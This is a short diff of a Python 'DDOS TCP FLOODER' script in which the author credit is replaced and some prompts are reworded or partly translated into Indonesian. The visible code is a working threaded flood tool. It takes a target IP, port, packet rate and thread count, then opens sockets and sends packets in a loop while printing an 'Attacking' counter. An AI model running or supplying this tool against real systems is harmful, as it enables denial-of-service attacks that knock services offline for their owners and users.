@@ -1,12 +1,12 @@
 # DDOS TCP FLOODER
-# FOR KIDS
-# CODER CYFA XO 
+# FOR XDEMPTERX
+# CODER XDEMPTERX 
 
 import socket
 import random
 import threading
 
-ip = str(input('[+] Target: '))
+ip = str(input('[+] Target Ip: '))
 port = int(input('[+] Port: '))
 pack = int(input('[+] Packet/s: '))
 thread = int(input('[+] Threads: '))
@@ -23,7 +23,7 @@ def start():
             for i in range(pack):
                 s.send(hh)
             xx += 1
-            print('Attacking '+ip+' | Sent: '+str(xx))
+            print('Mengirim Paket To Ip  '+ip+' | Send: '+str(xx))
         except:    
             s.close()
             print('Done')
